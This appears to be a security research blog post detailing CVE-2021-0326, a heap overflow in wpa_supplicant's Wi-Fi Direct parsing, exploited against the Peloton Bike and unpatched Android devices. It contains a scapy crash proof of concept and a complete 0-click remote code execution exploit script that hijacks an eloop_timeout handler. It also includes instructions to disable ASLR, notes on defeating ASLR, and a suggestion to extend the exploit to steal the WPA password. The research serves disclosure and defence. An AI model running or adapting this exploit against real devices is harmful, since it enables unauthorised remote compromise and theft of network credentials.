<p>The description of <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-0326">CVE-2021-0326</a> is</p>



<p><em>In p2p_copy_client_info of p2p.c, there is a possible out of bounds write due to a missing bounds check. This could lead to remote code execution if the target device is performing a Wi-Fi Direct search, with no additional execution privileges needed. User interaction is not needed for exploitation.</em></p>



<p>I had overlooked this CVE for a few reasons, namely that I didn’t know what a “Wi-Fi Direct search” was, and I didn’t know whether the attacker needed to be on the same network. This was a constraint I wanted to avoid if possible. However I discovered that a core feature of the Peloton Bike, the ability to screen cast, used Wi-Fi Direct as implemented by <a href="https://www.wi-fi.org/discover-wi-fi/miracast">Miracast</a>. This is an important feature of the Bike since its tablet can’t be turned (unlike the Bike+), so classes other than cycling are best viewed on a different screen. When the <strong>Cast Screen</strong> option is selected from the upper right corner menu the tablet performs the “WiFi Direct search” described in the CVE description. Since Wi-Fi Direct is a way to form ad hoc networks an attacker does not need to be on the same network as the victim device. This was beginning to look like an ideal target.</p>



<figure class="wp-block-image size-full"><img loading="lazy" width="525" height="719" src="https://www.nowsecure.com/wp-content/uploads/2022/02/WiFiDirect.png" alt="" class="wp-image-16301" srcset="https://www.nowsecure.com/wp-content/uploads/2022/02/WiFiDirect.png 525w, https://www.nowsecure.com/wp-content/uploads/2022/02/WiFiDirect-360x493.png 360w, https://www.nowsecure.com/wp-content/uploads/2022/02/WiFiDirect-175x240.png 175w" sizes="(max-width: 525px) 100vw, 525px" /></figure>



<p>There is essentially nothing written about this CVE besides what is in the description and what is in the commit message here</p>



<p><a href="https://android.googlesource.com/platform/external/wpa_supplicant_8/+/0b60cb210510c68871c8d735285bc4915de3bd80">0b60cb210510c68871c8d735285bc4915de3bd80 &#8211; platform/external/wpa_supplicant_8 &#8211; Git at Google</a>. </p>



<p>From the diff we can see that the vulnerable code in p2p_copy_client_info is:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: cpp; title: ; notranslate">
static void p2p_copy_client_info(struct p2p_device *dev,
				 struct p2p_client_info *cli)
{
	p2p_copy_filter_devname(dev-&gt;info.device_name,
				sizeof(dev-&gt;info.device_name),
				cli-&gt;dev_name, cli-&gt;dev_name_len);
	dev-&gt;info.dev_capab = cli-&gt;dev_capab;
	dev-&gt;info.config_methods = cli-&gt;config_methods;
	os_memcpy(dev-&gt;info.pri_dev_type, cli-&gt;pri_dev_type, 8);
	dev-&gt;info.wps_sec_dev_type_list_len = 8 * cli-&gt;num_sec_dev_types;
	os_memcpy(dev-&gt;info.wps_sec_dev_type_list, cli-&gt;sec_dev_types,
		  dev-&gt;info.wps_sec_dev_type_list_len);
}
</pre></div>


<p>There is no length check here to make sure that <code> 8 * cli-&gt;num_sec_dev_types</code> does not exceed the bounds of the field <code> wps_sec_dev_type_list</code> which has a capacity of 128 (8 bytes * 16 entries) in info, an instance of the <code> p2p_peer_info</code> struct defined in <code> p2p.h</code>:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: cpp; title: ; notranslate">
#define P2P_MAX_WPS_VENDOR_EXT 10

/**
 * struct p2p_peer_info - P2P peer information
 */
struct p2p_peer_info {
    ...
	/**
	 * wps_sec_dev_type_list - WPS secondary device type list
	 *
	 * This list includes from 0 to 16 Secondary Device Types as indicated
	 * by wps_sec_dev_type_list_len (8 * number of types).
	 */
	u8 wps_sec_dev_type_list&#91;WPS_SEC_DEV_TYPE_MAX_LEN]; // overflow occurs here

	/**
	 * wps_sec_dev_type_list_len - Length of secondary device type list
	 */
	size_t wps_sec_dev_type_list_len;

	struct wpabuf *wps_vendor_ext&#91;P2P_MAX_WPS_VENDOR_EXT]; // can overflow into this

	/**
	 * wfd_subelems - Wi-Fi Display subelements from WFD IE(s)
	 */
	struct wpabuf *wfd_subelems; // this 
	
	/**
	 * vendor_elems - Unrecognized vendor elements
	 *
	 * This buffer includes any other vendor element than P2P, WPS, and WFD
	 * IE(s) from the frame that was used to discover the peer.
	 */
	struct wpabuf *vendor_elems; // and this, but no further
	...
</pre></div>


<p><code> WPS_SEC_DEV_TYPE_MAX_LEN</code> is defined to be 128 in <code> wps.h</code>. It turns out there is also no length check in <code> p2p_group_info_parse</code>, the function where <code> cli-&gt;num_sec_dev_types</code> originates from (it is included here in full due to its importance)</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: cpp; title: ; notranslate">
int p2p_group_info_parse(const u8 *gi, size_t gi_len,
			 struct p2p_group_info *info)
{
	const u8 *g, *gend;

	os_memset(info, 0, sizeof(*info));
	if (gi == NULL)
		return 0;

	g = gi;
	gend = gi + gi_len;
	while (g &lt; gend) {
		struct p2p_client_info *cli;
		const u8 *cend;
		u16 count;
		u8 len;

		cli = &amp;info-&gt;client&#91;info-&gt;num_clients];
		len = *g++;
		if (len &gt; gend - g || len &lt; 2 * ETH_ALEN + 1 + 2 + 8 + 1)
			return -1; /* invalid data */
		cend = g + len;
		/* g at start of P2P Client Info Descriptor */
		cli-&gt;p2p_device_addr = g;
		g += ETH_ALEN;
		cli-&gt;p2p_interface_addr = g;
		g += ETH_ALEN;
		cli-&gt;dev_capab = *g++;

		cli-&gt;config_methods = WPA_GET_BE16(g);
		g += 2;
		cli-&gt;pri_dev_type = g;
		g += 8;

		/* g at Number of Secondary Device Types */
		len = *g++;
		if (8 * len &gt; cend - g)
			return -1; /* invalid data */
		cli-&gt;num_sec_dev_types = len;
		cli-&gt;sec_dev_types = g;
		g += 8 * len;

		/* g at Device Name in WPS TLV format */
		if (cend - g &lt; 2 + 2)
			return -1; /* invalid data */
		if (WPA_GET_BE16(g) != ATTR_DEV_NAME)
			return -1; /* invalid Device Name TLV */
		g += 2;
		count = WPA_GET_BE16(g);
		g += 2;
		if (count &gt; cend - g)
			return -1; /* invalid Device Name TLV */
		if (count &gt;= WPS_DEV_NAME_MAX_LEN)
			count = WPS_DEV_NAME_MAX_LEN;
		cli-&gt;dev_name = (const char *) g;
		cli-&gt;dev_name_len = count;

		g = cend;

		info-&gt;num_clients++;
		if (info-&gt;num_clients == P2P_MAX_GROUP_ENTRIES)
			return -1;
	}

	return 0;
}
</pre></div>


<p>The only constraint here is that the length of <code> sec_dev_types</code> cannot be larger than the remaining data in the buffer and the length of the data for each client needs to be less than 256 as it must fit in a <code> u8</code>. This puts some limits on what can be done with the vulnerability as it means that it can’t be used to leak data after the end of the controlled buffer, and it has a limited range to overflow. The group client info needs to include 23 bytes before the secondary devices, and a minimum of 4 for a zero length device name&nbsp; combined with the 128 bytes of secondary device types gives 101 bytes of overflow. There are 4 bytes between <code> wps_sec_dev_type_list</code> and <code> wps_vendor_ext</code>, the 4 bytes of <code> size_t wps_sec_dev_type_list_len</code>. Ultimately this allows the attacker to only overflow into <code> struct wpabuf *wps_vendor_ext[P2P_MAX_WPS_VENDOR_EXT], and struct wpabuf *wfd_subelems</code>. The only time these pointers are used after the overflow is when they are freed when the device is lost. Therefore the overflow can only be used to free up to 11 arbitrary addresses at a time.</p>



<p>I figured most of this out later, as initially I was focused on simply reproducing the crash from this overflow. The issue was discovered by <a href="https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=27269">OSS-Fuzz libFuzzer</a> and the only artifact was a raw dump of bytes with no information related to where they were to be used as input.&nbsp;</p>



<p>There was no public additional context given to help actually reproduce it. Eventually after reading much more of the source I discovered that I could reproduce the crash by modifying <code> p2p_group_build_probe_resp_ie</code> in the attackers wpa_supplicant in order to return a <code> wpabuf</code> containing only these bytes. With the help of Wireshark I was able to understand the meaning of the data and eventually created a minimal crash PoC Python script using scapy:&nbsp;</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: python; title: ; notranslate">
from scapy.all import *

iface = 'wlp4s0mon'           # interface in monitor mode
target = 'ac:04:0b:e9:30:69'  # target MAC address
mac = RandMAC()               # (fake) mac address of source 

dot11 = Dot11FCS(addr1=target, addr2=mac)
beacon = Dot11Beacon(cap='ESS+privacy')
essid = Dot11Elt(ID='SSID', info='DIRECT-XX') # DIRECT- SSID for WFD
rates = Dot11Elt(ID='Rates', info=b&quot;\x48&quot;)    # rate of monitor mode iface
rsn = Dot11Elt(ID='RSNinfo', info=(
    b&quot;\x01\x00&quot;          # RSN Version 1
    b&quot;\x00\x0f\xac\x02&quot;  # Group Cipher Suite : 00-0f-ac TKIP
    b&quot;\x02\x00&quot;          # 2 Pairwise Cipher Suites (next two lines)
    b&quot;\x00\x0f\xac\x04&quot;  # AES Cipher
    b&quot;\x00\x0f\xac\x02&quot;  # TKIP Cipher
    b&quot;\x01\x00&quot;          # 1 Authentication Key Management Suite (line below)
    b&quot;\x00\x0f\xac\x02&quot;  # Pre-Shared Key
    b&quot;\x00\x00&quot;))        # RSN Capabilities (no extra capabilities)

sec_devs = 0x13 # number of secondary device types
group = (
    b&quot;AAAAAA&quot; +                    # p2p client device addr
    b&quot;BBBBBB&quot; +                    # p2p client interface addr
    b&quot;\xff&quot; + b&quot;\x01\x88&quot; +        # capabilities, config methods
    b&quot;EEEEEEEE&quot; +                  # primary dev type
    struct.pack(&quot;&lt;B&quot;, sec_devs) +  # secondary dev type count
    b&quot;\x00&quot;*(sec_devs*8-12) +      # nulls to fill up sec devs
    b&quot;AAAAAAAA&quot; +                  # address to be freed
    b&quot;\x00\x00\x00\x00&quot; +          # 4 nulls for padding
    b&quot;\x10\x11\x00\x00&quot;)           # empty device name 

group = struct.pack(&quot;&lt;B&quot;, len(group)) + group # p2p group info 
p2p = Dot11EltVendorSpecific(oui=0x506f9a, info=(
    b&quot;\x09\x03&quot; +                    # p2p identifier
    b&quot;\x06\x00&quot; + b&quot;CCCCCC&quot; +        # p2p device id len, id
    b&quot;\x0e&quot; +                        # p2p client info identifier
    struct.pack(&quot;&lt;H&quot;, len(group)) +  # total length of group client 
    group))                          # group client data

# assemble and send packet
packet = RadioTap()/dot11/beacon/essid/rates/rsn/p2p
sendp(packet, iface=iface, inter=0.100, loop=1)
</pre></div>


<p>You can match up the contents of group here to the different fields parsed in <code> p2p_group_info_parse</code>. This is the most important part of the script, the rest is mostly setup to create a proper packet. You may need to change the rates field to work with the channel your interface is on, as well as change the interface name and target of course. Running this script and then clicking on <strong>Cast Screen</strong> on the Peloton resulted in a crash log with <code> fault addr 0x41414141414159</code> where both <code> x0 = 4141414141414141</code> and <code> x19 = 4141414141414141</code> and the backtrace contained:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: plain; title: ; notranslate">
#00 pc 000000000001b950  /system/bin/wpa_supplicant
#01 pc 000000000004a1c4  /system/bin/wpa_supplicant
#02 pc 0000000000050204  /system/bin/wpa_supplicant
...
</pre></div>


<p>On an Android 9 Pixel 3a the backtrace is symbolicated so that we can see the crash is in <code> wpabuf_free</code>:</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: plain; title: ; notranslate">
#00 pc 0000000000045bb4  /vendor/bin/hw/wpa_supplicant (wpabuf_free.cfi+20)
#01 pc 0000000000078674  /vendor/bin/hw/wpa_supplicant (p2p_device_free.cfi+164)
#02 pc 000000000007f818  /vendor/bin/hw/wpa_supplicant (p2p_flush.cfi+124)
...
</pre></div>


<p>Looking at this address in radare2 we can see the exact instruction that led to the crash. The instruction in question checks the <code> flags</code> field of the <code> wpabuf</code> and if it is 0 (it normally is) it frees the <code> wpabuf</code> address stored in <code> x19</code>.</p>



<figure class="wp-block-image size-large"><img loading="lazy" width="960" height="635" src="https://www.nowsecure.com/wp-content/uploads/2022/02/Radare2RCEVuln-960x635.png" alt="" class="wp-image-16302" srcset="https://www.nowsecure.com/wp-content/uploads/2022/02/Radare2RCEVuln-960x635.png 960w, https://www.nowsecure.com/wp-content/uploads/2022/02/Radare2RCEVuln-360x238.png 360w, https://www.nowsecure.com/wp-content/uploads/2022/02/Radare2RCEVuln-768x508.png 768w, https://www.nowsecure.com/wp-content/uploads/2022/02/Radare2RCEVuln-1536x1017.png 1536w, https://www.nowsecure.com/wp-content/uploads/2022/02/Radare2RCEVuln-240x160.png 240w, https://www.nowsecure.com/wp-content/uploads/2022/02/Radare2RCEVuln.png 1999w" sizes="(max-width: 960px) 100vw, 960px" /></figure>



<p>Now that we know the vulnerability can be used to free arbitrary addresses it&#8217;s time to start the real exploit.</p>



<h3><strong>Exploitation</strong></h3>



<p>After a decent amount of research about the possibility of leaking addresses or remotely spraying the heap enough to reliably bypass ASLR, I determined that instead I should begin by creating an exploit that worked with ASLR disabled. Accordingly the PoC in the next section will not work on stock devices, all of which will have the address space randomized. A subsequent section will detail possible ways of defeating ASLR, and I am quite confident that an experienced exploit developer could use these strategies successfully in an exploit.&nbsp;</p>



<p>With the ability to free arbitrary locations, and the knowledge of where structures are on the heap, my initial plan was to find a <code> struct</code> containing a callback function pointer, free it, then overwrite it with attacker controlled data. In particular there are a few good candidates for data to overwrite with, and they are ones we have already seen: <code> struct wpabuf *wps_vendor_ext[P2P_MAX_WPS_VENDOR_EXT]</code> and <code> struct wpabuf *wfd_subelems</code>. These are allocated in <code> p2p_add_device</code></p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: cpp; title: ; notranslate">
...
	for (i = 0; i &lt; P2P_MAX_WPS_VENDOR_EXT; i++) {
		wpabuf_free(dev-&gt;info.wps_vendor_ext&#91;i]);
		dev-&gt;info.wps_vendor_ext&#91;i] = NULL;
	}

	for (i = 0; i &lt; P2P_MAX_WPS_VENDOR_EXT; i++) {
		if (msg.wps_vendor_ext&#91;i] == NULL)
			break;
		dev-&gt;info.wps_vendor_ext&#91;i] = wpabuf_alloc_copy(
			msg.wps_vendor_ext&#91;i], msg.wps_vendor_ext_len&#91;i]);
		if (dev-&gt;info.wps_vendor_ext&#91;i] == NULL)
			break;
	}

	wfd_changed = p2p_compare_wfd_info(dev, &amp;msg);

	if (msg.wfd_subelems) {
		wpabuf_free(dev-&gt;info.wfd_subelems);
		dev-&gt;info.wfd_subelems = wpabuf_dup(msg.wfd_subelems);
	}
	...
</pre></div>


<p>In general I will use <code> struct wpabuf *wps_vendor_ext</code> to perform overwrites of data freed with the arbitrary free primitive, as up to 10 (<code> P2P_MAX_WPS_VENDOR_EXT)</code> can be allocated with each sent packet, and their length can be completely controlled. Vendor extensions can be added to the packet in the scapy script easily</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: python; title: ; notranslate">
vendor_ext = Dot11EltVendorSpecific(oui=0x0050f2, info=b&quot;\x04\x10\x49&quot; + ... )
...
packet = packet / vendor_ext
</pre></div>


<p><code> wps_vendor_ext</code> is a <code> wpabuf</code>, a structure the exploit will deal with a lot so it is definitely worth delving into its layout. Its definition is in <code> wpabuf.h</code></p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: plain; title: ; notranslate">
struct wpabuf {
	size_t size; /* total size of the allocated buffer */
	size_t used; /* length of data in the buffer */
	u8 *buf; /* pointer to the head of the buffer */
	unsigned int flags;
	/* optionally followed by the allocated buffer */
};
</pre></div>


<p>It is the data structure that wpa_supplicant uses to store essentially every buffer of unknown length. Nearly every single heap allocation of attacker controlled data is stored in a <code> wpabuf</code>. This creates some issues for the previously planned heap exploit as the <code> size</code>,&nbsp;<code> used</code>, and <code> flag</code> fields will not be controllable and will need to overwrite fields that will not disrupt the execution. Additionally the buf pointer may cause issues, but could also be useful to write a pointer to the controlled data. This turns out to be quite tricky as illustrated by the first attempted overwrite target, <code> wpa_radio</code> defined in <code> wpa_supplicant_i.h</code>.</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: cpp; title: ; notranslate">
/**
 * struct wpa_radio - Internal data for per-radio information
 *
 * This structure is used to share data about configured interfaces
 * (struct wpa_supplicant) that share the same physical radio, e.g., to allow
 * better coordination of offchannel operations.
 */
struct wpa_radio {
	char name&#91;16]; /* from driver_ops get_radio_name() or empty if not
			* available */
	unsigned int external_scan_running:1;
	unsigned int num_active_works;
	struct dl_list ifaces; /* struct wpa_supplicant::radio_list entries */
	struct dl_list work; /* struct wpa_radio_work::list entries */
};

#define MAX_ACTIVE_WORKS 2

struct wpa_radio_work {
	struct dl_list list;
    ...
	void (*cb)(struct wpa_radio_work *work, int deinit);
	...
};
</pre></div>


<p><code> wpa_radio</code> was chosen specifically because it starts with <code> name[16]</code> which means that by overwriting it with a <code> wpabuf</code> we do not have to worry about <code> size</code> and <code> used</code> overwriting anything important. Unfortunately the same cannot be said of <code> flags</code> and <code> buf</code>. Here <code> buf</code> overwrites <code> num_active_works</code> and <code> flags</code> and the 4 bytes of padding after it overwrites the first <code> iface</code> pointer in the doubly-linked list. The goal here was to overwrite the <code> work</code> field with pointers to fake <code> wpa_radio_work</code> entries that have the function pointer <code> cb</code>. Unfortunately the code before <code> cb</code> is called contains references to the <code> iface</code> and a compiler optimization removes the NULL check for it (as it could only be NULL through undefined behavior). This results in a crash that is difficult to avoid. Even when avoided there is another check to make sure <code> num_active_works</code> is less than <code> MAX_ACTIVE_WORKS</code> before the callback. The pointer <code> buf</code> when interpreted as an <code> unsigned int</code> is larger than 2. Trying to offset the data to change where the fields landed within <code> wpa_radio</code> led to crashes from overwriting crucial structures in the adjacent heap allocations.</p>



<figure class="wp-block-image size-large"><img loading="lazy" width="1129" height="189" src="https://www.nowsecure.com/wp-content/uploads/2022/02/wpa_radio.drawio-3-2.svg" alt="" class="wp-image-16318"/></figure>



<p>This target was a disaster as there were many tricks that very, very nearly made it work. But ultimately it was not the right choice to overwrite. With a large complex program like wpa_supplicant it is somewhat surprising but there are actually relatively few good picks for this. After more searching I landed on&nbsp;<code> eloop_timeout</code> defined in <code> eloop.c</code>.</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: cpp; title: ; notranslate">
struct eloop_timeout {
	struct dl_list list;
	struct os_reltime time;
	void *eloop_data;
	void *user_data;
	eloop_timeout_handler handler;
	WPA_TRACE_REF(eloop);
	WPA_TRACE_REF(user);
	WPA_TRACE_INFO
};

typedef void (*eloop_timeout_handler)(void *eloop_data, void *user_ctx);
</pre></div>


<p>This is related to the radio structures as these <code> eloop_timeout</code> are used to schedule repeated tasks within wpa_supplicant, including the scans that use <code> wpa_radio</code>. Once the <code> time</code> in the <code> timeout</code> has been reached the <code> handler</code> function is called with <code> eloop_data</code> and <code> user_data</code> as arguments. These scheduled tasks are stored in a global static variable called <code> eloop</code> that contains a doubly linked list of every active <code> eloop_timeout</code> (called <code> timeout</code>). It happened that the first <code> eloop_timeout</code> was reliably located at <code> 0x7fb743d1c0</code>. However freeing <code> 0x7fb743d1c0</code> would lead to that address being reallocated by our chosen data. This would mean that <code> struct dl_list list</code> will be overwritten by <code> size</code> and <code> used</code>. This is a problem as it will cause crashes when the list is traversed in the functions in <code> eloop.c</code>. So instead the exploit can offset the free, using <code> 0x7fb743d1a0 (0x7fb743d1c0-0x20)</code>, which will lead to an allocation at this address. Since these allocations are 0x40 bytes or less the exploit can then overwrite the first 0x20 bytes of this <code> eloop_timeout</code>. Now <code> struct dl_list list</code> is overwritten with fully attacker controlled data, the body of a <code> wps_vendor_ext</code>. Using this we can forge an entry in the list that points to fully attacker controlled data, and also repair the list so that it does not crash when traversed.&nbsp;The <code> struct dl_list</code> consists of two pointers, <code> next</code> and <code> prev</code> implementing a doubly linked list</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: cpp; title: ; notranslate">
/**
 * struct dl_list - Doubly-linked list
 */
struct dl_list {
	struct dl_list *next;
	struct dl_list *prev;
};

#define DL_LIST_HEAD_INIT(l) { &amp;(l), &amp;(l) }

static inline void dl_list_init(struct dl_list *list)
{
	list-&gt;next = list;
	list-&gt;prev = list;
}
...
static inline int dl_list_empty(struct dl_list *list)
{
	return list-&gt;next == list;
}
...
</pre></div>


<p>A <code> list</code> is terminated when the current <code> item.next</code> is back at the address of the <code> list</code> itself. Therefore in order to insert a new entry with the overwrite, <code> next</code> needs to point to our new fake entry and <code> prev</code> must still point to <code> list</code>, which here is <code> 0x55556fc6b0</code> an address in the static variable <code> eloop</code> in the main module. Next our fake entry, made from the contents of another <code> wps_vendor_ext</code>, starts with a <code> dl_list</code> which has a <code> next</code> that points to <code> 0x55556fc6b0</code> and a <code> prev</code> that points to <code> 0x7fb743d1c0</code>. This constitutes a valid chain of <code> dl_list</code> entries so that the <code> eloop_timeout</code> functions will not crash before reaching the <code> handler</code> function pointer in our fake entry. At this point it is time to show the finished exploit</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: python; title: ; notranslate">
from scapy.all import *
import argparse

desc = &quot;&quot;&quot;
Skeleton (but pronounced like Peloton):
A 0-click RCE exploit for CVE-2021-0326

Austin Emmitt of Nowsecure (@alkalinesec)
&quot;&quot;&quot;

parser = argparse.ArgumentParser(description=desc,
    formatter_class=argparse.RawTextHelpFormatter)

parser.add_argument('-i', dest='interface', required=True,
    help='network interface in monitor mode')
parser.add_argument('-t', dest='target', required=True, 
    help='target MAC address')
args = parser.parse_args()

iface = args.interface        # interface in monitor mode
target = args.target          # target MAC address

base  = 0x5555555000          # base address of main module
eloop = 0x7fb743d1c0          # eloop_timeout address
p2    = 0x7fb742e500          # second part of payload

eloop_next = base + 0x1a76b0  # eloop next (&amp;list terminates)
wpa_printf = base + 0x1a938   # addr of wpa_printf

msg = b&quot;hi :)&quot;                # log on success (&lt; 8 bytes)
frees = &#91;eloop-0x20]          # list of addrs to free (up to 10)
sec_devs = 0x12+len(frees)    # number of secondary device types

p64 = lambda x: struct.pack(&quot;&lt;Q&quot;, x)

def build_beacon(dev_mac, client_mac):
    group = (
        client_mac + b&quot;CCCCCC\xffDDEEEEEEEE&quot; +  # p2p client information
        struct.pack(&quot;&lt;B&quot;, sec_devs) +           # secondary dev count
        b&quot;\x00&quot;*(sec_devs*8-8*len(frees)-4) +   # nulls to fill up sec devs
        b&quot;&quot;.join(p64(x) for x in frees) +       # addresses to be freed
        b&quot;\x00\x00\x00\x00\x10\x11\x00\x00&quot;)    # empty device name 

    group = struct.pack(&quot;&lt;B&quot;, len(group)) + group # p2p group info 
    p2p = Dot11EltVendorSpecific(oui=0x506f9a, info=(
        b&quot;\x09\x03\x06\x00&quot; + dev_mac +          # p2p device id, group info
        b&quot;\x0e&quot; +                                # p2p group info identifier
        struct.pack(&quot;&lt;H&quot;, len(group)) + group))  # len of group info 

    ext_data1 = (
        p64(p2) +          # next: address of ext_data2
        p64(eloop_next) +  # previous: address of terminator
        b&quot;\x00&quot;*16)        # times filled with 00 so it doesn't reorder

    vendor1 = Dot11EltVendorSpecific(oui=0x0050f2, info=(
        b&quot;\x04\x10\x49&quot; +                    # vendor extension id
        struct.pack(&quot;&gt;H&quot;, len(ext_data1)) +  # length of 1st payload
        ext_data1))                          # 1st payload data

    ext_data2 = (
        p64(eloop_next) +            # next: address of terminator
        p64(eloop) +                 # previous: address of ext_data1
        p64(0) + p64(0) +            # times set to 0 so it runs right away
        p64(5) + p64(p2+0x38) +      # error level, address of msg 
        p64(wpa_printf) +            # addr of wpa_printf to jump to 
        msg + b&quot;\x00&quot;*(8-len(msg)))  # message and null padding

    vendor2 = Dot11EltVendorSpecific(oui=0x0050f2, info=(
        b&quot;\x04\x10\x49&quot; +                    # vendor extension id
        struct.pack(&quot;&gt;H&quot;, len(ext_data2)) +  # length of 2nd payload
        ext_data2))                          # 2nd payload data

    mac = RandMAC() # (fake) mac address of source 
    dot11 = Dot11FCS(addr1=target, addr2=mac, addr3=mac)
    beacon = Dot11Beacon(cap='ESS+privacy')
    essid = Dot11Elt(ID='SSID', info='DIRECT-XX') 
    rates = Dot11Elt(ID='Rates', info=b&quot;\x48&quot;)    
    rsn = Dot11Elt(ID='RSNinfo', info=(
        b&quot;\x01\x00&quot;          # RSN Version 1
        b&quot;\x00\x0f\xac\x02&quot;  # Group Cipher Suite : 00-0f-ac TKIP
        b&quot;\x02\x00&quot;          # 2 Pairwise Cipher Suites 
        b&quot;\x00\x0f\xac\x04&quot;  # AES Cipher
        b&quot;\x00\x0f\xac\x02&quot;  # TKIP Cipher
        b&quot;\x01\x00&quot;          # 1 Authentication Key Management Suite 
        b&quot;\x00\x0f\xac\x02&quot;  # Pre-Shared Key
        b&quot;\x00\x00&quot;))        # RSN Capabilities 

    # assemble packet
    packet = RadioTap()/dot11/beacon/essid/rates/rsn/p2p

    # add fake eloop_timeout elements
    for vendor in (vendor1, vendor2):
        for i in range(5):
            packet = packet / vendor

    return packet 

mac1 = b&quot;AAAAAA&quot;  # first dev MAC
mac2 = b&quot;BBBBBB&quot;  # first client MAC

# two packets with swapped addresses 
# to free at least ones vendor_ext
packet1 = build_beacon(mac1, mac2)
packet2 = build_beacon(mac2, mac1)

print(&quot;sending exploit to %s&quot; % target)
sendp(&#91;packet1, packet2], iface=iface, inter=0.100, loop=1)
</pre></div>


<p>Much of this script should be familiar from the crash PoC. The new parts are the two vendor extension elements, <code> ext_data1</code> which will overwrite the beginning of the <code> eloop_timeout</code> at <code> 0x7fb743d1c0</code>, and <code> ext_data2</code> which will contain the fake <code> eloop_timeout</code> that is added to the doubly linked list. The address of <code> p2, 0x7fb742e500</code>, has some room for error as the payloads are spread many times throughout these regions of the heap. The address <code> 0x7fb742e500</code> was chosen as it was the first address that was fully reliable, but <code> 0x7fb742e580, 0x7fb742e600…</code> would also have worked. The second payload also sets the <code> time</code> field to be all zeros, which will allow the timeout to run immediately. Finally <code> eloop_data</code> and <code> user_data</code> are passed as arguments to the <code> handler</code> when it is called</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: plain; title: ; notranslate">
/* check if some registered timeouts have occurred */
timeout = dl_list_first(&amp;eloop.timeout, struct eloop_timeout, list);
if (timeout) {
	os_get_reltime(&amp;now);
	if (!os_reltime_before(&amp;now, &amp;timeout-&gt;time)) {
		void *eloop_data = timeout-&gt;eloop_data;
		void *user_data = timeout-&gt;user_data;
		eloop_timeout_handler handler = timeout-&gt;handler;
		eloop_remove_timeout(timeout);
		handler(eloop_data, user_data);
	}
}
</pre></div>


<p>This is very convenient and the exploit can simply set <code> eloop_data</code>, <code> user_data</code>, and <code> handler</code> to 5, the address of the last 8 bytes of our payload, and the address of <code> wpa_printf</code> respectively in order to completely set up a call that will log our message to prove the code execution succeeded.&nbsp;</p>



<p>See the below diagram for an illustration of the overwrite that occurs, and how the overwrite adds the new entry to the <code> eloop_timeout</code> list.</p>



<figure class="wp-block-image size-large"><img loading="lazy" width="1137" height="659" src="https://www.nowsecure.com/wp-content/uploads/2022/02/eloop.drawio-6-1.svg" alt="" class="wp-image-16320"/></figure>



<p>In order to make this exploit work on your device you will need to disable ASLR (use <code> echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>) and also get the correct addresses for your version of wpa_supplicant. <a href="https://github.com/aemmitt-ns/skeleton">In the repo for this blog post</a> there will be a Frida script that can help in determining those values. After running the script with the correct <code> target</code> and <code> interface</code> arguments, wait 15 seconds or so and then tap <strong>Cast Screen </strong>on the Peloton (or go to <strong>Wifi Direct</strong> in Settings on any other unpatched Android device). After a few seconds the exploit should succeed and logcat will contain output similar to</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: plain; title: ; notranslate">
...
D wpa_supplicant: P2P: * Device Info
D wpa_supplicant: p2p-dev-wlan0: Add radio work 'p2p-listen'@0x7fb742e540
D wpa_supplicant: p2p-dev-wlan0: First radio work item in the queue - schedule start immediately
E wpa_supplicant: hi :)
</pre></div>


<p>(followed by a crash, this is not a graceful exploit). If the exploit does not succeed and there is no crash, press the refresh button in the top right of the <strong>Cast Screen</strong> menu, it may be that the device did not receive the exploit beacons in time. In a realistic attack scenario an attacker can get the <code> target</code> MAC address by sniffing on the same interface to find probe requests looking for the &#8220;Direct-&#8221; SSID. </p>



<p>A more interesting exploit of this vulnerability could find the WPA PSK password of the network the device is on and send it back to the attacker through a probe request / response or beacon by e.g. replacing the Manufacturer field with the password. The password for my network was reliably located at <code> 0x7fb742a400</code> so this should be relatively simple to implement.</p>



    <div id="featured-resource-block"
         class="cta-id-16307 resource-id-15845 post-type-resource_item">

                    <div class="image-holder" style="background-image: url(https://www.nowsecure.com/wp-content/uploads/2021/10/Pen-Testing-Ebook-feat-image-1200x628-1.png)"></div>
            <!-- /.image-holder -->

        
        <div class="content-holder">

            <div class="transparent-shape"></div>
            <!-- /.transparent-shape -->
            <div class="grey-shape"></div>
            <!-- /.grey-shape -->

            <div class="content-in">

                                    <h3 class="resource-title">
                        How to Build A Successful Mobile App Penetration Testing Program                    </h3>
                    <!-- /.resource-title -->

                
                
                                    <a href="https://discover.nowsecure.com/c/mobile-app-pen-testing-whitepaper?x=cEXJzu"
                       target="_blank">

                        Learn More
                    </a>
                    <!-- /.resource-link -->

                
            </div>
            <!-- /.content-in -->

        </div>
        <!-- /.content-holder -->

    </div>
    <!-- /#featured-resource-block -->



<p></p>



<h3><strong>Defeating ASLR</strong></h3>



<p>While the PoC above requires ASLR to be disabled it is entirely possible that an exploit could be written to bypass this requirement. If a separate way to leak memory to the attacker was found, bypassing ASLR in the exploit should be relatively easy. It only really requires two addresses, the base address of the main module and the one heap mapping. The offsets could be found for each different version of wpa_supplicant. Leaking a small amount of data from many structs (like the <code> eloop_timeout</code> used in the exploit) would supply the necessary addresses.</p>



<p>Without a separate way to discover addresses there are only two tools to potentially bypass ASLR: partial overwrites and spraying the heap. It may be possible to perform a somewhat useful partial overwrite by first sending a probe request packet with P2P device information and WiFi Display subelements. In <code> p2p_add_dev_from_probe_req</code> in <code> p2p.c</code> there is code to add <code> wfd_subelems</code></p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: cpp; title: ; notranslate">
...
	dev-&gt;flags |= P2P_DEV_PROBE_REQ_ONLY;
	...
	if (msg.wfd_subelems) {
		wpabuf_free(dev-&gt;info.wfd_subelems);
		dev-&gt;info.wfd_subelems = wpabuf_dup(msg.wfd_subelems);
	}
	...
</pre></div>


